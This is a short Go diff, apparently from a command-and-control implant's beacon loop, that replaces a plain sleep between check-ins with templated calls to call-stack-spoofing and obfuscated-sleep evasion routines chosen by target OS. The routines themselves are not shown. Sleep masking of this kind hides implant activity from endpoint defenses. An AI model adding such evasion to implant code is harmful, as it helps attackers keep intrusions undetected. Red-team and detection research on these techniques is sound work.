@@ -326,7 +326,11 @@ func pulseCheckinLoop(pulse *transports.Pulse, pendingResults *pulseResultQueue,
 			// finishes before its deadline. If it overruns, begin the next
 			// check-in immediately without overlapping shared transport state.
 			if remaining := time.Until(nextCheckin); 0 < remaining {
-				time.Sleep(remaining)
+				// {{if eq .Config.GOOS "windows"}}
+				evasion.SleepWithCallstackSpoof(remaining)
+				// {{else}}
+				evasion.ObfuscatedSleep(remaining)
+				// {{end}}
 			}
 		}
 
